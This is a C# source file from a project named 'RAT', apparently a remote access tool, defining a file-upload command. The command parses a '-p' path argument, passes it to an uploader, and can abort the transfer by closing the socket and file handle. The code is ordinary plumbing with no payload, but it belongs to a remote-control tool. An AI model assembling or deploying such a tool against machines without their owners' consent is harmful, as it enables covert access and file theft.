﻿using RAT.Interfaces;
using RAT.Models;
using System;
using System.Linq;

namespace RAT.Logic.RatCommands.Commands
{
    /// <summary>
    /// Rat command for file upload.
    /// </summary>
    public class UploadFileCommand : IUploadFileCommand
    {
        private readonly IClientNotificationLogic _notificationLogic;
        private readonly ISocketStateLogic _stateLogic;
        private readonly IFileUploader _fileUploader;
        private readonly IRatCommandInterpreter _commandInterpreter;

        /// <summary>
        /// Rat command for file upload.
        /// </summary>
        /// <param name="clientNotificationLogic">Logic for client notification.</param>
        /// <param name="fileUploader">File upload functionality.</param>
        /// <param name="commandInterpreter">Our client command interpreter.</param>
        /// <param name="stateLogic">Our clients/socket current state.</param>
        public UploadFileCommand(
            IClientNotificationLogic clientNotificationLogic,
            IRatCommandInterpreter commandInterpreter,
            ISocketStateLogic stateLogic,
            IFileUploader fileUploader)
        {
            _notificationLogic = clientNotificationLogic;
            _fileUploader = fileUploader;
            _commandInterpreter = commandInterpreter;
            _stateLogic = stateLogic;
        }

        /// <summary>
        /// Executes command to upload file.
        /// </summary>
        /// <param name="command">Fully specified command with arguments that should be processed and excuted.</param>
        public void Execute(string command)
        {
            var args = _commandInterpreter.GetArgumentsForCommand(command);

            int indexOfPath = Array.IndexOf(args, "-p");
            if (indexOfPath == -1 || args.ElementAtOrDefault(indexOfPath + 1) == null)
            {
                _notificationLogic.NotifyClient($"\n\"-p\" (path) argument not found for RAT\n");
                return;
            }

            string filePath = args[indexOfPath + 1];
            _fileUploader.PrepareForFileUpload(filePath);
        }

        /// <summary>
        ///  Aborts file upload.
        /// </summary>
        public void Abort()
        {
            var state = _stateLogic.State;
            try
            {
                state.FileUploadInformation.ClientFileUploadSocket?.Disconnect(reuseSocket: false);
                state.FileUploadInformation.ClientFileUploadSocket?.Close();
                state.FileUploadInformation.FileDataArray = null;
            }
            catch (Exception exception)
            {
                _notificationLogic.NotifyClient($"Error during operation abort: {exception.Message}");
            }

            try
            {
                state.FileUploadInformation.FileHandle?.Dispose();
                state.FileUploadInformation.FileHandle?.Close();
            }
            catch (Exception) { }

            state.FileUploadInformation = new FileUploadInformation();
        }
    }
}